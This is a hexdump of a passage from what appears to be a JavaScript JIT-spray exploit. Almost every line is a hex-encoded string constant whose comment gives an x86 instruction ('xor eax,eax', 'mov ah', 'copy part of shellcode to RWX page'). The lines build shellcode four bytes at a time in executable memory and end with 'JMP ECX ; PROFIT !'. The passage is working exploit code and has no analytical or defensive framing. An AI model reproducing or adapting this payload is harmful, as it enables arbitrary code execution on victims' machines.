00003310  76 65 20 70 6f 69 6e 74  65 72 0d 0a 22 30 78 31  |ve pointer.."0x1|
00003320  34 65 62 30 31 38 39 5e  22 2b 20 2f 2f 20 6d 6f  |4eb0189^"+ // mo|
00003330  76 20 5b 65 63 78 5d 2c  20 65 61 78 20 3b 20 63  |v [ecx], eax ; c|
00003340  6f 70 79 20 70 61 72 74  20 6f 66 20 73 68 65 6c  |opy part of shel|
00003350  6c 63 6f 64 65 20 74 6f  20 52 57 58 20 70 61 67  |lcode to RWX pag|
00003360  65 0d 0a 20 0d 0a 22 30  78 31 34 65 62 63 30 33  |e.. .."0x14ebc03|
00003370  31 5e 22 2b 20 2f 2f 20  78 6f 72 20 65 61 78 2c  |1^"+ // xor eax,|
00003380  65 61 78 0d 0a 22 30 78  31 34 65 62 62 38 62 34  |eax.."0x14ebb8b4|
00003390  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 68 2c 20 62  |^"+ // mov ah, b|
000033a0  38 0d 0a 22 30 78 31 34  65 62 65 37 62 30 5e 22  |8.."0x14ebe7b0^"|
000033b0  2b 20 2f 2f 20 6d 6f 76  20 61 6c 2c 20 65 37 0d  |+ // mov al, e7.|
000033c0  0a 22 30 78 31 34 65 62  65 30 66 37 5e 22 2b 20  |."0x14ebe0f7^"+ |
000033d0  2f 2f 20 45 41 58 0d 0a  22 30 78 31 34 65 62 66  |// EAX.."0x14ebf|
000033e0  66 62 34 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 68  |fb4^"+ // mov ah|
000033f0  2c 20 66 66 0d 0a 22 30  78 31 34 65 62 66 66 62  |, ff.."0x14ebffb|
00003400  30 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 6c 2c 20  |0^"+ // mov al, |
00003410  66 66 0d 0a 22 30 78 31  34 65 62 34 30 39 30 5e  |ff.."0x14eb4090^|
00003420  22 2b 20 2f 2f 20 69 6e  63 20 65 61 78 0d 0a 22  |"+ // inc eax.."|
00003430  30 78 31 34 65 62 30 31  62 34 5e 22 2b 20 2f 2f  |0x14eb01b4^"+ //|
00003440  20 6d 6f 76 20 61 68 2c  20 30 31 0d 0a 22 30 78  | mov ah, 01.."0x|
00003450  31 34 65 62 36 61 62 30  5e 22 2b 20 2f 2f 20 6d  |14eb6ab0^"+ // m|
00003460  6f 76 20 61 6c 2c 20 36  61 0d 0a 22 30 78 31 34  |ov al, 6a.."0x14|
00003470  65 62 63 62 30 33 5e 22  2b 20 2f 2f 20 61 64 64  |ebcb03^"+ // add|
00003480  20 65 63 78 2c 20 65 62  78 20 3b 20 65 63 78 3d  | ecx, ebx ; ecx=|
00003490  65 63 78 2b 34 20 2d 20  6d 6f 76 65 20 70 6f 69  |ecx+4 - move poi|
000034a0  6e 74 65 72 0d 0a 22 30  78 31 34 65 62 30 31 38  |nter.."0x14eb018|
000034b0  39 5e 22 2b 20 2f 2f 20  6d 6f 76 20 5b 65 63 78  |9^"+ // mov [ecx|
000034c0  5d 2c 20 65 61 78 20 3b  20 63 6f 70 79 20 70 61  |], eax ; copy pa|
000034d0  72 74 20 6f 66 20 73 68  65 6c 6c 63 6f 64 65 20  |rt of shellcode |
000034e0  74 6f 20 52 57 58 20 70  61 67 65 0d 0a 20 0d 0a  |to RWX page.. ..|
000034f0  22 30 78 31 34 65 62 63  30 33 31 5e 22 2b 20 2f  |"0x14ebc031^"+ /|
00003500  2f 20 78 6f 72 20 65 61  78 2c 65 61 78 0d 0a 22  |/ xor eax,eax.."|
00003510  30 78 31 34 65 62 62 39  62 30 5e 22 2b 20 2f 2f  |0x14ebb9b0^"+ //|
00003520  20 6d 6f 76 20 61 6c 2c  20 62 39 0d 0a 22 30 78  | mov al, b9.."0x|
00003530  31 34 65 62 63 62 30 33  5e 22 2b 20 2f 2f 20 61  |14ebcb03^"+ // a|
00003540  64 64 20 65 63 78 2c 20  65 62 78 20 3b 20 65 63  |dd ecx, ebx ; ec|
00003550  78 3d 65 63 78 2b 34 20  2d 20 6d 6f 76 65 20 70  |x=ecx+4 - move p|
00003560  6f 69 6e 74 65 72 0d 0a  22 30 78 31 34 65 62 30  |ointer.."0x14eb0|
00003570  31 38 39 5e 22 2b 20 2f  2f 20 6d 6f 76 20 5b 65  |189^"+ // mov [e|
00003580  63 78 5d 2c 20 65 61 78  20 3b 20 63 6f 70 79 20  |cx], eax ; copy |
00003590  70 61 72 74 20 6f 66 20  73 68 65 6c 6c 63 6f 64  |part of shellcod|
000035a0  65 20 74 6f 20 52 57 58  20 70 61 67 65 0d 0a 20  |e to RWX page.. |
000035b0  0d 0a 22 30 78 31 34 65  62 63 30 33 31 5e 22 2b  |.."0x14ebc031^"+|
000035c0  20 2f 2f 20 78 6f 72 20  65 61 78 2c 65 61 78 0d  | // xor eax,eax.|
000035d0  0a 22 30 78 31 34 65 62  62 63 62 34 5e 22 2b 20  |."0x14ebbcb4^"+ |
000035e0  2f 2f 20 6d 6f 76 20 61  68 2c 20 62 63 0d 0a 22  |// mov ah, bc.."|
000035f0  30 78 31 34 65 62 63 35  62 30 5e 22 2b 20 2f 2f  |0x14ebc5b0^"+ //|
00003600  20 6d 6f 76 20 61 6c 2c  20 63 35 0d 0a 22 30 78  | mov al, c5.."0x|
00003610  31 34 65 62 65 30 66 37  5e 22 2b 20 2f 2f 20 45  |14ebe0f7^"+ // E|
00003620  41 58 0d 0a 22 30 78 31  34 65 62 36 38 62 34 5e  |AX.."0x14eb68b4^|
00003630  22 2b 20 2f 2f 20 6d 6f  76 20 61 68 2c 20 36 38  |"+ // mov ah, 68|
00003640  0d 0a 22 30 78 31 34 65  62 35 30 62 30 5e 22 2b  |.."0x14eb50b0^"+|
00003650  20 2f 2f 20 6d 6f 76 20  61 6c 2c 20 35 30 0d 0a  | // mov al, 50..|
00003660  22 30 78 31 34 65 62 63  62 30 33 5e 22 2b 20 2f  |"0x14ebcb03^"+ /|
00003670  2f 20 61 64 64 20 65 63  78 2c 20 65 62 78 20 3b  |/ add ecx, ebx ;|
00003680  20 65 63 78 3d 65 63 78  2b 34 20 2d 20 6d 6f 76  | ecx=ecx+4 - mov|
00003690  65 20 70 6f 69 6e 74 65  72 0d 0a 22 30 78 31 34  |e pointer.."0x14|
000036a0  65 62 30 31 38 39 5e 22  2b 20 2f 2f 20 6d 6f 76  |eb0189^"+ // mov|
000036b0  20 5b 65 63 78 5d 2c 20  65 61 78 20 3b 20 63 6f  | [ecx], eax ; co|
000036c0  70 79 20 70 61 72 74 20  6f 66 20 73 68 65 6c 6c  |py part of shell|
000036d0  63 6f 64 65 20 74 6f 20  52 57 58 20 70 61 67 65  |code to RWX page|
000036e0  0d 0a 20 0d 0a 22 30 78  31 34 65 62 63 30 33 31  |.. .."0x14ebc031|
000036f0  5e 22 2b 20 2f 2f 20 78  6f 72 20 65 61 78 2c 65  |^"+ // xor eax,e|
00003700  61 78 0d 0a 22 30 78 31  34 65 62 65 61 62 34 5e  |ax.."0x14ebeab4^|
00003710  22 2b 20 2f 2f 20 6d 6f  76 20 61 68 2c 20 65 61  |"+ // mov ah, ea|
00003720  0d 0a 22 30 78 31 34 65  62 30 66 62 30 5e 22 2b  |.."0x14eb0fb0^"+|
00003730  20 2f 2f 20 6d 6f 76 20  61 6c 2c 20 30 66 0d 0a  | // mov al, 0f..|
00003740  22 30 78 31 34 65 62 65  30 66 37 5e 22 2b 20 2f  |"0x14ebe0f7^"+ /|
00003750  2f 20 45 41 58 0d 0a 22  30 78 31 34 65 62 38 37  |/ EAX.."0x14eb87|
00003760  62 34 5e 22 2b 20 2f 2f  20 6d 6f 76 20 61 68 2c  |b4^"+ // mov ah,|
00003770  20 38 37 0d 0a 22 30 78  31 34 65 62 36 66 62 30  | 87.."0x14eb6fb0|
00003780  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 6c 2c 20 36  |^"+ // mov al, 6|
00003790  66 0d 0a 22 30 78 31 34  65 62 63 62 30 33 5e 22  |f.."0x14ebcb03^"|
000037a0  2b 20 2f 2f 20 61 64 64  20 65 63 78 2c 20 65 62  |+ // add ecx, eb|
000037b0  78 20 3b 20 65 63 78 3d  65 63 78 2b 34 20 2d 20  |x ; ecx=ecx+4 - |
000037c0  6d 6f 76 65 20 70 6f 69  6e 74 65 72 0d 0a 22 30  |move pointer.."0|
000037d0  78 31 34 65 62 30 31 38  39 5e 22 2b 20 2f 2f 20  |x14eb0189^"+ // |
000037e0  6d 6f 76 20 5b 65 63 78  5d 2c 20 65 61 78 20 3b  |mov [ecx], eax ;|
000037f0  20 63 6f 70 79 20 70 61  72 74 20 6f 66 20 73 68  | copy part of sh|
00003800  65 6c 6c 63 6f 64 65 20  74 6f 20 52 57 58 20 70  |ellcode to RWX p|
00003810  61 67 65 0d 0a 20 0d 0a  22 30 78 31 34 65 62 63  |age.. .."0x14ebc|
00003820  30 33 31 5e 22 2b 20 2f  2f 20 78 6f 72 20 65 61  |031^"+ // xor ea|
00003830  78 2c 65 61 78 0d 0a 22  30 78 31 34 65 62 63 63  |x,eax.."0x14ebcc|
00003840  62 34 5e 22 2b 20 2f 2f  20 6d 6f 76 20 61 68 2c  |b4^"+ // mov ah,|
00003850  20 63 63 0d 0a 22 30 78  31 34 65 62 31 37 62 30  | cc.."0x14eb17b0|
00003860  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 6c 2c 20 31  |^"+ // mov al, 1|
00003870  37 0d 0a 22 30 78 31 34  65 62 65 30 66 37 5e 22  |7.."0x14ebe0f7^"|
00003880  2b 20 2f 2f 20 45 41 58  0d 0a 22 30 78 31 34 65  |+ // EAX.."0x14e|
00003890  62 66 66 62 34 5e 22 2b  20 2f 2f 20 6d 6f 76 20  |bffb4^"+ // mov |
000038a0  61 68 2c 20 66 66 0d 0a  22 30 78 31 34 65 62 66  |ah, ff.."0x14ebf|
000038b0  66 62 30 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 6c  |fb0^"+ // mov al|
000038c0  2c 20 66 66 0d 0a 22 30  78 31 34 65 62 34 30 39  |, ff.."0x14eb409|
000038d0  30 5e 22 2b 20 2f 2f 20  69 6e 63 20 65 61 78 0d  |0^"+ // inc eax.|
000038e0  0a 22 30 78 31 34 65 62  66 30 62 34 5e 22 2b 20  |."0x14ebf0b4^"+ |
000038f0  2f 2f 20 6d 6f 76 20 61  68 2c 20 66 30 0d 0a 22  |// mov ah, f0.."|
00003900  30 78 31 34 65 62 62 62  62 30 5e 22 2b 20 2f 2f  |0x14ebbbb0^"+ //|
00003910  20 6d 6f 76 20 61 6c 2c  20 62 62 0d 0a 22 30 78  | mov al, bb.."0x|
00003920  31 34 65 62 63 62 30 33  5e 22 2b 20 2f 2f 20 61  |14ebcb03^"+ // a|
00003930  64 64 20 65 63 78 2c 20  65 62 78 20 3b 20 65 63  |dd ecx, ebx ; ec|
00003940  78 3d 65 63 78 2b 34 20  2d 20 6d 6f 76 65 20 70  |x=ecx+4 - move p|
00003950  6f 69 6e 74 65 72 0d 0a  22 30 78 31 34 65 62 30  |ointer.."0x14eb0|
00003960  31 38 39 5e 22 2b 20 2f  2f 20 6d 6f 76 20 5b 65  |189^"+ // mov [e|
00003970  63 78 5d 2c 20 65 61 78  20 3b 20 63 6f 70 79 20  |cx], eax ; copy |
00003980  70 61 72 74 20 6f 66 20  73 68 65 6c 6c 63 6f 64  |part of shellcod|
00003990  65 20 74 6f 20 52 57 58  20 70 61 67 65 0d 0a 20  |e to RWX page.. |
000039a0  0d 0a 22 30 78 31 34 65  62 63 30 33 31 5e 22 2b  |.."0x14ebc031^"+|
000039b0  20 2f 2f 20 78 6f 72 20  65 61 78 2c 65 61 78 0d  | // xor eax,eax.|
000039c0  0a 22 30 78 31 34 65 62  63 33 62 34 5e 22 2b 20  |."0x14ebc3b4^"+ |
000039d0  2f 2f 20 6d 6f 76 20 61  68 2c 20 63 33 0d 0a 22  |// mov ah, c3.."|
000039e0  30 78 31 34 65 62 62 62  62 30 5e 22 2b 20 2f 2f  |0x14ebbbb0^"+ //|
000039f0  20 6d 6f 76 20 61 6c 2c  20 62 62 0d 0a 22 30 78  | mov al, bb.."0x|
00003a00  31 34 65 62 65 30 66 37  5e 22 2b 20 2f 2f 20 45  |14ebe0f7^"+ // E|
00003a10  41 58 0d 0a 22 30 78 31  34 65 62 36 38 62 34 5e  |AX.."0x14eb68b4^|
00003a20  22 2b 20 2f 2f 20 6d 6f  76 20 61 68 2c 20 36 38  |"+ // mov ah, 68|
00003a30  0d 0a 22 30 78 31 34 65  62 35 36 62 30 5e 22 2b  |.."0x14eb56b0^"+|
00003a40  20 2f 2f 20 6d 6f 76 20  61 6c 2c 20 35 36 0d 0a  | // mov al, 56..|
00003a50  22 30 78 31 34 65 62 63  62 30 33 5e 22 2b 20 2f  |"0x14ebcb03^"+ /|
00003a60  2f 20 61 64 64 20 65 63  78 2c 20 65 62 78 20 3b  |/ add ecx, ebx ;|
00003a70  20 65 63 78 3d 65 63 78  2b 34 20 2d 20 6d 6f 76  | ecx=ecx+4 - mov|
00003a80  65 20 70 6f 69 6e 74 65  72 0d 0a 22 30 78 31 34  |e pointer.."0x14|
00003a90  65 62 30 31 38 39 5e 22  2b 20 2f 2f 20 6d 6f 76  |eb0189^"+ // mov|
00003aa0  20 5b 65 63 78 5d 2c 20  65 61 78 20 3b 20 63 6f  | [ecx], eax ; co|
00003ab0  70 79 20 70 61 72 74 20  6f 66 20 73 68 65 6c 6c  |py part of shell|
00003ac0  63 6f 64 65 20 74 6f 20  52 57 58 20 70 61 67 65  |code to RWX page|
00003ad0  0d 0a 20 0d 0a 22 30 78  31 34 65 62 63 30 33 31  |.. .."0x14ebc031|
00003ae0  5e 22 2b 20 2f 2f 20 78  6f 72 20 65 61 78 2c 65  |^"+ // xor eax,e|
00003af0  61 78 0d 0a 22 30 78 31  34 65 62 65 61 62 34 5e  |ax.."0x14ebeab4^|
00003b00  22 2b 20 2f 2f 20 6d 6f  76 20 61 68 2c 20 65 61  |"+ // mov ah, ea|
00003b10  0d 0a 22 30 78 31 34 65  62 30 66 62 30 5e 22 2b  |.."0x14eb0fb0^"+|
00003b20  20 2f 2f 20 6d 6f 76 20  61 6c 2c 20 30 66 0d 0a  | // mov al, 0f..|
00003b30  22 30 78 31 34 65 62 65  30 66 37 5e 22 2b 20 2f  |"0x14ebe0f7^"+ /|
00003b40  2f 20 45 41 58 0d 0a 22  30 78 31 34 65 62 39 64  |/ EAX.."0x14eb9d|
00003b50  62 34 5e 22 2b 20 2f 2f  20 6d 6f 76 20 61 68 2c  |b4^"+ // mov ah,|
00003b60  20 39 64 0d 0a 22 30 78  31 34 65 62 62 64 62 30  | 9d.."0x14ebbdb0|
00003b70  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 6c 2c 20 62  |^"+ // mov al, b|
00003b80  64 0d 0a 22 30 78 31 34  65 62 63 62 30 33 5e 22  |d.."0x14ebcb03^"|
00003b90  2b 20 2f 2f 20 61 64 64  20 65 63 78 2c 20 65 62  |+ // add ecx, eb|
00003ba0  78 20 3b 20 65 63 78 3d  65 63 78 2b 34 20 2d 20  |x ; ecx=ecx+4 - |
00003bb0  6d 6f 76 65 20 70 6f 69  6e 74 65 72 0d 0a 22 30  |move pointer.."0|
00003bc0  78 31 34 65 62 30 31 38  39 5e 22 2b 20 2f 2f 20  |x14eb0189^"+ // |
00003bd0  6d 6f 76 20 5b 65 63 78  5d 2c 20 65 61 78 20 3b  |mov [ecx], eax ;|
00003be0  20 63 6f 70 79 20 70 61  72 74 20 6f 66 20 73 68  | copy part of sh|
00003bf0  65 6c 6c 63 6f 64 65 20  74 6f 20 52 57 58 20 70  |ellcode to RWX p|
00003c00  61 67 65 0d 0a 20 0d 0a  22 30 78 31 34 65 62 63  |age.. .."0x14ebc|
00003c10  30 33 31 5e 22 2b 20 2f  2f 20 78 6f 72 20 65 61  |031^"+ // xor ea|
00003c20  78 2c 65 61 78 0d 0a 22  30 78 31 34 65 62 33 33  |x,eax.."0x14eb33|
00003c30  62 34 5e 22 2b 20 2f 2f  20 6d 6f 76 20 61 68 2c  |b4^"+ // mov ah,|
00003c40  20 33 33 0d 0a 22 30 78  31 34 65 62 63 66 62 30  | 33.."0x14ebcfb0|
00003c50  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 6c 2c 20 63  |^"+ // mov al, c|
00003c60  66 0d 0a 22 30 78 31 34  65 62 65 30 66 37 5e 22  |f.."0x14ebe0f7^"|
00003c70  2b 20 2f 2f 20 45 41 58  0d 0a 22 30 78 31 34 65  |+ // EAX.."0x14e|
00003c80  62 30 36 62 34 5e 22 2b  20 2f 2f 20 6d 6f 76 20  |b06b4^"+ // mov |
00003c90  61 68 2c 20 30 36 0d 0a  22 30 78 31 34 65 62 33  |ah, 06.."0x14eb3|
00003ca0  63 62 30 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 6c  |cb0^"+ // mov al|
00003cb0  2c 20 33 63 0d 0a 22 30  78 31 34 65 62 63 62 30  |, 3c.."0x14ebcb0|
00003cc0  33 5e 22 2b 20 2f 2f 20  61 64 64 20 65 63 78 2c  |3^"+ // add ecx,|
00003cd0  20 65 62 78 20 3b 20 65  63 78 3d 65 63 78 2b 34  | ebx ; ecx=ecx+4|
00003ce0  20 2d 20 6d 6f 76 65 20  70 6f 69 6e 74 65 72 0d  | - move pointer.|
00003cf0  0a 22 30 78 31 34 65 62  30 31 38 39 5e 22 2b 20  |."0x14eb0189^"+ |
00003d00  2f 2f 20 6d 6f 76 20 5b  65 63 78 5d 2c 20 65 61  |// mov [ecx], ea|
00003d10  78 20 3b 20 63 6f 70 79  20 70 61 72 74 20 6f 66  |x ; copy part of|
00003d20  20 73 68 65 6c 6c 63 6f  64 65 20 74 6f 20 52 57  | shellcode to RW|
00003d30  58 20 70 61 67 65 0d 0a  20 0d 0a 22 30 78 31 34  |X page.. .."0x14|
00003d40  65 62 63 30 33 31 5e 22  2b 20 2f 2f 20 78 6f 72  |ebc031^"+ // xor|
00003d50  20 65 61 78 2c 65 61 78  0d 0a 22 30 78 31 34 65  | eax,eax.."0x14e|
00003d60  62 61 64 62 34 5e 22 2b  20 2f 2f 20 6d 6f 76 20  |badb4^"+ // mov |
00003d70  61 68 2c 20 61 64 0d 0a  22 30 78 31 34 65 62 62  |ah, ad.."0x14ebb|
00003d80  37 62 30 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 6c  |7b0^"+ // mov al|
00003d90  2c 20 62 37 0d 0a 22 30  78 31 34 65 62 65 30 66  |, b7.."0x14ebe0f|
00003da0  37 5e 22 2b 20 2f 2f 20  45 41 58 0d 0a 22 30 78  |7^"+ // EAX.."0x|
00003db0  31 34 65 62 66 62 62 34  5e 22 2b 20 2f 2f 20 6d  |14ebfbb4^"+ // m|
00003dc0  6f 76 20 61 68 2c 20 66  62 0d 0a 22 30 78 31 34  |ov ah, fb.."0x14|
00003dd0  65 62 38 30 62 30 5e 22  2b 20 2f 2f 20 6d 6f 76  |eb80b0^"+ // mov|
00003de0  20 61 6c 2c 20 38 30 0d  0a 22 30 78 31 34 65 62  | al, 80.."0x14eb|
00003df0  63 62 30 33 5e 22 2b 20  2f 2f 20 61 64 64 20 65  |cb03^"+ // add e|
00003e00  63 78 2c 20 65 62 78 20  3b 20 65 63 78 3d 65 63  |cx, ebx ; ecx=ec|
00003e10  78 2b 34 20 2d 20 6d 6f  76 65 20 70 6f 69 6e 74  |x+4 - move point|
00003e20  65 72 0d 0a 22 30 78 31  34 65 62 30 31 38 39 5e  |er.."0x14eb0189^|
00003e30  22 2b 20 2f 2f 20 6d 6f  76 20 5b 65 63 78 5d 2c  |"+ // mov [ecx],|
00003e40  20 65 61 78 20 3b 20 63  6f 70 79 20 70 61 72 74  | eax ; copy part|
00003e50  20 6f 66 20 73 68 65 6c  6c 63 6f 64 65 20 74 6f  | of shellcode to|
00003e60  20 52 57 58 20 70 61 67  65 0d 0a 20 0d 0a 22 30  | RWX page.. .."0|
00003e70  78 31 34 65 62 63 30 33  31 5e 22 2b 20 2f 2f 20  |x14ebc031^"+ // |
00003e80  78 6f 72 20 65 61 78 2c  65 61 78 0d 0a 22 30 78  |xor eax,eax.."0x|
00003e90  31 34 65 62 34 36 62 34  5e 22 2b 20 2f 2f 20 6d  |14eb46b4^"+ // m|
00003ea0  6f 76 20 61 68 2c 20 34  36 0d 0a 22 30 78 31 34  |ov ah, 46.."0x14|
00003eb0  65 62 34 30 62 30 5e 22  2b 20 2f 2f 20 6d 6f 76  |eb40b0^"+ // mov|
00003ec0  20 61 6c 2c 20 34 30 0d  0a 22 30 78 31 34 65 62  | al, 40.."0x14eb|
00003ed0  65 30 66 37 5e 22 2b 20  2f 2f 20 45 41 58 0d 0a  |e0f7^"+ // EAX..|
00003ee0  22 30 78 31 34 65 62 62  62 62 34 5e 22 2b 20 2f  |"0x14ebbbb4^"+ /|
00003ef0  2f 20 6d 6f 76 20 61 68  2c 20 62 62 0d 0a 22 30  |/ mov ah, bb.."0|
00003f00  78 31 34 65 62 30 35 62  30 5e 22 2b 20 2f 2f 20  |x14eb05b0^"+ // |
00003f10  6d 6f 76 20 61 6c 2c 20  30 35 0d 0a 22 30 78 31  |mov al, 05.."0x1|
00003f20  34 65 62 63 62 30 33 5e  22 2b 20 2f 2f 20 61 64  |4ebcb03^"+ // ad|
00003f30  64 20 65 63 78 2c 20 65  62 78 20 3b 20 65 63 78  |d ecx, ebx ; ecx|
00003f40  3d 65 63 78 2b 34 20 2d  20 6d 6f 76 65 20 70 6f  |=ecx+4 - move po|
00003f50  69 6e 74 65 72 0d 0a 22  30 78 31 34 65 62 30 31  |inter.."0x14eb01|
00003f60  38 39 5e 22 2b 20 2f 2f  20 6d 6f 76 20 5b 65 63  |89^"+ // mov [ec|
00003f70  78 5d 2c 20 65 61 78 20  3b 20 63 6f 70 79 20 70  |x], eax ; copy p|
00003f80  61 72 74 20 6f 66 20 73  68 65 6c 6c 63 6f 64 65  |art of shellcode|
00003f90  20 74 6f 20 52 57 58 20  70 61 67 65 0d 0a 20 0d  | to RWX page.. .|
00003fa0  0a 22 30 78 31 34 65 62  63 30 33 31 5e 22 2b 20  |."0x14ebc031^"+ |
00003fb0  2f 2f 20 78 6f 72 20 65  61 78 2c 65 61 78 0d 0a  |// xor eax,eax..|
00003fc0  22 30 78 31 34 65 62 30  61 62 34 5e 22 2b 20 2f  |"0x14eb0ab4^"+ /|
00003fd0  2f 20 6d 6f 76 20 61 68  2c 20 30 61 0d 0a 22 30  |/ mov ah, 0a.."0|
00003fe0  78 31 34 65 62 34 63 62  30 5e 22 2b 20 2f 2f 20  |x14eb4cb0^"+ // |
00003ff0  6d 6f 76 20 61 6c 2c 20  34 63 0d 0a 22 30 78 31  |mov al, 4c.."0x1|
00004000  34 65 62 65 30 66 37 5e  22 2b 20 2f 2f 20 45 41  |4ebe0f7^"+ // EA|
00004010  58 0d 0a 22 30 78 31 34  65 62 36 66 62 34 5e 22  |X.."0x14eb6fb4^"|
00004020  2b 20 2f 2f 20 6d 6f 76  20 61 68 2c 20 36 66 0d  |+ // mov ah, 6f.|
00004030  0a 22 30 78 31 34 65 62  37 32 62 30 5e 22 2b 20  |."0x14eb72b0^"+ |
00004040  2f 2f 20 6d 6f 76 20 61  6c 2c 20 37 32 0d 0a 22  |// mov al, 72.."|
00004050  30 78 31 34 65 62 63 62  30 33 5e 22 2b 20 2f 2f  |0x14ebcb03^"+ //|
00004060  20 61 64 64 20 65 63 78  2c 20 65 62 78 20 3b 20  | add ecx, ebx ; |
00004070  65 63 78 3d 65 63 78 2b  34 20 2d 20 6d 6f 76 65  |ecx=ecx+4 - move|
00004080  20 70 6f 69 6e 74 65 72  0d 0a 22 30 78 31 34 65  | pointer.."0x14e|
00004090  62 30 31 38 39 5e 22 2b  20 2f 2f 20 6d 6f 76 20  |b0189^"+ // mov |
000040a0  5b 65 63 78 5d 2c 20 65  61 78 20 3b 20 63 6f 70  |[ecx], eax ; cop|
000040b0  79 20 70 61 72 74 20 6f  66 20 73 68 65 6c 6c 63  |y part of shellc|
000040c0  6f 64 65 20 74 6f 20 52  57 58 20 70 61 67 65 0d  |ode to RWX page.|
000040d0  0a 20 0d 0a 22 30 78 31  34 65 62 63 30 33 31 5e  |. .."0x14ebc031^|
000040e0  22 2b 20 2f 2f 20 78 6f  72 20 65 61 78 2c 65 61  |"+ // xor eax,ea|
000040f0  78 0d 0a 22 30 78 31 34  65 62 39 66 62 34 5e 22  |x.."0x14eb9fb4^"|
00004100  2b 20 2f 2f 20 6d 6f 76  20 61 68 2c 20 39 66 0d  |+ // mov ah, 9f.|
00004110  0a 22 30 78 31 34 65 62  64 65 62 30 5e 22 2b 20  |."0x14ebdeb0^"+ |
00004120  2f 2f 20 6d 6f 76 20 61  6c 2c 20 64 65 0d 0a 22  |// mov al, de.."|
00004130  30 78 31 34 65 62 65 30  66 37 5e 22 2b 20 2f 2f  |0x14ebe0f7^"+ //|
00004140  20 45 41 58 0d 0a 22 30  78 31 34 65 62 66 66 62  | EAX.."0x14ebffb|
00004150  34 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 68 2c 20  |4^"+ // mov ah, |
00004160  66 66 0d 0a 22 30 78 31  34 65 62 35 33 62 30 5e  |ff.."0x14eb53b0^|
00004170  22 2b 20 2f 2f 20 6d 6f  76 20 61 6c 2c 20 35 33  |"+ // mov al, 53|
00004180  0d 0a 22 30 78 31 34 65  62 63 62 30 33 5e 22 2b  |.."0x14ebcb03^"+|
00004190  20 2f 2f 20 61 64 64 20  65 63 78 2c 20 65 62 78  | // add ecx, ebx|
000041a0  20 3b 20 65 63 78 3d 65  63 78 2b 34 20 2d 20 6d  | ; ecx=ecx+4 - m|
000041b0  6f 76 65 20 70 6f 69 6e  74 65 72 0d 0a 22 30 78  |ove pointer.."0x|
000041c0  31 34 65 62 30 31 38 39  5e 22 2b 20 2f 2f 20 6d  |14eb0189^"+ // m|
000041d0  6f 76 20 5b 65 63 78 5d  2c 20 65 61 78 20 3b 20  |ov [ecx], eax ; |
000041e0  63 6f 70 79 20 70 61 72  74 20 6f 66 20 73 68 65  |copy part of she|
000041f0  6c 6c 63 6f 64 65 20 74  6f 20 52 57 58 20 70 61  |llcode to RWX pa|
00004200  67 65 0d 0a 20 0d 0a 22  30 78 31 34 65 62 63 30  |ge.. .."0x14ebc0|
00004210  33 31 5e 22 2b 20 2f 2f  20 78 6f 72 20 65 61 78  |31^"+ // xor eax|
00004220  2c 65 61 78 0d 0a 22 30  78 31 34 65 62 30 39 62  |,eax.."0x14eb09b|
00004230  34 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 68 2c 20  |4^"+ // mov ah, |
00004240  30 39 0d 0a 22 30 78 31  34 65 62 66 34 62 30 5e  |09.."0x14ebf4b0^|
00004250  22 2b 20 2f 2f 20 6d 6f  76 20 61 6c 2c 20 66 34  |"+ // mov al, f4|
00004260  0d 0a 22 30 78 31 34 65  62 65 30 66 37 5e 22 2b  |.."0x14ebe0f7^"+|
00004270  20 2f 2f 20 45 41 58 0d  0a 22 30 78 31 34 65 62  | // EAX.."0x14eb|
00004280  36 63 62 34 5e 22 2b 20  2f 2f 20 6d 6f 76 20 61  |6cb4^"+ // mov a|
00004290  68 2c 20 36 63 0d 0a 22  30 78 31 34 65 62 36 31  |h, 6c.."0x14eb61|
000042a0  62 30 5e 22 2b 20 2f 2f  20 6d 6f 76 20 61 6c 2c  |b0^"+ // mov al,|
000042b0  20 36 31 0d 0a 22 30 78  31 34 65 62 63 62 30 33  | 61.."0x14ebcb03|
000042c0  5e 22 2b 20 2f 2f 20 61  64 64 20 65 63 78 2c 20  |^"+ // add ecx, |
000042d0  65 62 78 20 3b 20 65 63  78 3d 65 63 78 2b 34 20  |ebx ; ecx=ecx+4 |
000042e0  2d 20 6d 6f 76 65 20 70  6f 69 6e 74 65 72 0d 0a  |- move pointer..|
000042f0  22 30 78 31 34 65 62 30  31 38 39 5e 22 2b 20 2f  |"0x14eb0189^"+ /|
00004300  2f 20 6d 6f 76 20 5b 65  63 78 5d 2c 20 65 61 78  |/ mov [ecx], eax|
00004310  20 3b 20 63 6f 70 79 20  70 61 72 74 20 6f 66 20  | ; copy part of |
00004320  73 68 65 6c 6c 63 6f 64  65 20 74 6f 20 52 57 58  |shellcode to RWX|
00004330  20 70 61 67 65 0d 0a 20  0d 0a 20 0d 0a 22 30 78  | page.. .. .."0x|
00004340  31 34 65 62 30 30 62 35  5e 22 2b 20 2f 2f 20 6d  |14eb00b5^"+ // m|
00004350  6f 76 20 63 68 2c 20 30  30 0d 0a 22 30 78 31 34  |ov ch, 00.."0x14|
00004360  65 62 30 30 62 31 5e 22  2b 20 2f 2f 20 6d 6f 76  |eb00b1^"+ // mov|
00004370  20 63 6c 2c 20 30 30 20  3b 20 45 43 58 20 3d 20  | cl, 00 ; ECX = |
00004380  30 36 30 31 30 30 30 30  20 3b 20 52 57 45 20 6d  |06010000 ; RWE m|
00004390  65 6d 6f 72 79 20 57 49  54 48 20 73 68 65 6c 6c  |emory WITH shell|
000043a0  63 6f 64 65 0d 0a 22 30  78 31 34 65 62 65 31 66  |code.."0x14ebe1f|
000043b0  66 5e 22 2b 20 2f 2f 20  4a 4d 50 20 45 43 58 20  |f^"+ // JMP ECX |
000043c0  3b 20 50 52 4f 46 49 54  20 21 0d 0a 20 0d 0a 22  |; PROFIT !.. .."|
000043d0  30 78 31 34 65 62 63 63  63 63 22 2b 0d 0a 22 29  |0x14ebcccc"+..")|
000043e0  3b 22 2b 0d 0a 22 72 65  74 75 72 6e 20 79 3b 20  |;"+.."return y; |
000043f0  7d 22 3b 0d 0a 20 0d 0a  20 0d 0a 76 61 72 20 7a  |}";.. .. ..var z|
